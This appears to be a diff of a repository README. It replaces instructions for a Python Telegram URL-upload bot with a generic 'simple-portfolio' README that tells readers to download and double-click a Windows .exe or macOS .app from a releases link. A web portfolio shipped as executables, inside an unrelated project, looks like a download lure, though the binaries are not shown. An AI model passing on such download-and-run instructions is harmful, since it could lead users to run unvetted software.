@@ -1,31 +1,62 @@
-# URL-Upload-Bot
----
+# 🎨 simple-portfolio - A Modern, Customizable Portfolio Page
 
-An Open Source ALL-In-One Telegram RoBot, that can do lot of things.
+[![Download simple-portfolio](https://img.shields.io/badge/Download-simple--portfolio-blue?style=for-the-badge)](https://github.com/AnujTechGuru/simple-portfolio/releases)
 
-**My Features**:
+## 📦 Introduction
+Welcome to **simple-portfolio**! This is a simple and modern portfolio page that you can fully customize to showcase your work. It is lightweight and designed to be both user-friendly and visually appealing. Whether you're an artist, developer, or freelancer, this portfolio can help you present your skills effectively.
 
-👉 All Supported Video Formats of https://rg3.github.io/youtube-dl/supportedsites.html
+## 🚀 Getting Started
+To begin, follow these steps to download and run the application.
 
-👉 Upload as file from any HTTP link
+## 🔗 Download & Install
+1. **Visit the Release Page**
+   Click this link to visit the [Releases page](https://github.com/AnujTechGuru/simple-portfolio/releases) where you can find the latest version of the application.
 
-### Installation
+2. **Choose the Latest Version**
+   On the Releases page, look for the latest version marked with "Latest release." This is usually at the top.
 
-#### The Easy Way
+3. **Download the Application**
+   You will see several files available for download. If you are using Windows, download the file named `simple-portfolio-win.zip`. For macOS users, download `simple-portfolio-mac.zip`.
 
-#### You can also tap the Deploy To Heroku button below to deploy straight to Heroku!
+4. **Unzip the Downloaded File**
+   After the download is complete, locate the file in your Downloads folder. Right-click on the downloaded ZIP file and select "Extract All" or "Unzip" to extract the files.
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/4amparaboy/URLUploader)
+5. **Run the Application**
+   Once you have unzipped the files:
+   - For Windows users: Open the folder and double-click `simple-portfolio.exe`.
+   - For macOS users: Open the folder and double-click `simple-portfolio.app`.
 
-[CyberBoyAyush](https://github.com/CyberBoyAyush/URL-Upload-Bot) For Original Repo
+You’re all set! The application should open, allowing you to customize and enjoy your new portfolio page.
 
-#### The Hard Way
+## ⚙️ System Requirements
+To ensure smooth performance, please ensure your system meets the following requirements:
+- **Operating System**: Windows 10 or later, macOS Mojave or later
+- **Browser**: Latest version of Chrome, Firefox, or Safari
+- **RAM**: At least 4 GB
+- **Disk Space**: A minimum of 100 MB free space for installation
 
-```sh
-virtualenv -p python3 VENV
-. ./VENV/bin/activate
-pip install -r requirements.txt
-cp sample_config.py config.py
---- EDIT config.py values appropriately ---
-python bot.py
-```
+## 🎨 Features
+- **Fully Customizable**: Change colors, fonts, and layouts to suit your style.
+- **Lightweight Design**: Fast-loading and efficient for all users.
+- **Responsive Layout**: Looks great on both desktop and mobile devices.
+- **Easily Expandable**: Add sections for blogs, galleries, and more.
+
+## 📄 Usage
+Once the application is running, you can start customizing your portfolio right away. Use the interface to:
+- Add sections for your projects.
+- Upload images and videos to showcase your work.
+- Customize the theme with colors and fonts that reflect your personality.
+
+## 👥 Support
+If you encounter any issues while downloading or running the application, feel free to consult the [issues page](https://github.com/AnujTechGuru/simple-portfolio/issues) for help or report a new problem.
+
+## 📂 Additional Resources
+- **Documentation**: For detailed instructions on customization options, visit the [Wiki page](https://github.com/AnujTechGuru/simple-portfolio/wiki).
+- **Forum**: Join our community forum for tips, tricks, and shared experiences with other users.
+
+## 🔗 Important Links
+- **Release Page**: [Download simple-portfolio](https://github.com/AnujTechGuru/simple-portfolio/releases)
+- **Wiki**: [Documentation](https://github.com/AnujTechGuru/simple-portfolio/wiki)
+- **Issues Page**: [Report Issues](https://github.com/AnujTechGuru/simple-portfolio/issues)
+
+Thank you for choosing **simple-portfolio**! We hope this tool helps you effectively showcase your work.
